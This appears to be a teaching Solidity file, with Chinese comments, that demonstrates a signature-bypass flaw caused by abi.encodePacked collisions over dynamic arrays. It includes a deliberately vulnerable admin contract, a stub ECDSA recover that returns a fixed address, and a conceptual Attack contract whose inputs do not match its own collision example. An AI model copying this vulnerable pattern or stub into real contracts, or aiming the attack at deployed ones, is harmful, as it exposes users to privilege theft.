pragma solidity >=0.8.0;

// SPDX-License-Identifier: UNLICENSED

// 此範例展示 Incorrect Argument Encoding 漏洞，利用 abi.encodePacked 編碼動態參數可能產生碰撞，進而繞過簽名驗證。
// 注意：此示範中的 ECDSA recover 實作僅為簡化示例, 實際應用請使用 OpenZeppelin ECDSA

library ECDSA {
    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        if (signature.length != 65) {
            revert("invalid signature length");
        }
        bytes32 r;
        bytes32 s;
        uint8 v;
        
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        // 這裡僅作展示，實際應用請參照 OpenZeppelin ECDSA
        // 此處僅回傳假定的回復地址
        return address(0x1234567890123456789012345678901234567890);
    }

    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }
}

contract VulnerableAccessControl {
    using ECDSA for bytes32;

    // 狀態變數: 管理員與一般使用者
    mapping(address => bool) public isAdmin; // 漏洞重點：管理員驗證機制
    mapping(address => bool) public isRegularUser;

    // 部署時初始化部署者為管理員
    constructor() {
        isAdmin[msg.sender] = true;
    }

    // 此方法透過簽名驗證來允許非管理員呼叫, 但使用了錯誤的參數編碼方式
    function addUsers(
        address[] calldata admins,
        address[] calldata regularUsers,
        bytes calldata signature
    ) external {
        // 如果呼叫者不是管理員，需要透過管理員簽名授權
        if (!isAdmin[msg.sender]) {
            // 漏洞所在：使用 abi.encodePacked 導致不同輸入可能產生相同的拼接結果
            bytes32 hash = keccak256(abi.encodePacked(admins, regularUsers));
            address signer = hash.toEthSignedMessageHash().recover(signature);
            require(isAdmin[signer], "Only admins can add users.");
        }

        // 將傳入的 admins 與 regularUsers 註冊
        for (uint256 i = 0; i < admins.length; i++) {
            isAdmin[admins[i]] = true;
        }
        for (uint256 i = 0; i < regularUsers.length; i++) {
            isRegularUser[regularUsers[i]] = true;
        }
    }
}

// 攻擊範例: 利用不正確的編碼方式，攻擊者可能透過構造碰撞資料繞過簽名驗證
contract Attack {
    VulnerableAccessControl public target;

    // 攻擊者部署時需提供 VulnerableAccessControl 的地址
    constructor(VulnerableAccessControl _target) {
        target = _target;
    }

    // performAttack 示意如何利用 encodePacked 可能的碰撞漏洞進行攻擊
    function performAttack(bytes calldata adminSignature) external {
        // 實際攻擊需要精心構造 collision，但以下僅概念性展示
        // 範例構造兩組不同參數可能導致相同的 keccak256(abi.encodePacked(...)) 結果
        // 組合一: admins = [0x1111111111111111111111111111111111111111],
        //       regularUsers = [0x2222222222222222222222222222222222222222, 0x3333333333333333333333333333333333333333]
        // 組合二: admins = [0x1111111111111111111111111111111111111111, 0x2222222222222222222222222222222222222222],
        //       regularUsers = [0x3333333333333333333333333333333333333333]
        
        // 以下為示例, 攻擊者將構造第二組資料以竊取新增權限
        address[] memory admins = new address[](1);
        admins[0] = msg.sender;
        
        address[] memory regularUsers = new address[](1);
        // 修正地址格式，使用正確 checksum 格式:
        regularUsers[0] = 0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF;

        target.addUsers(admins, regularUsers, adminSignature);
    }
}
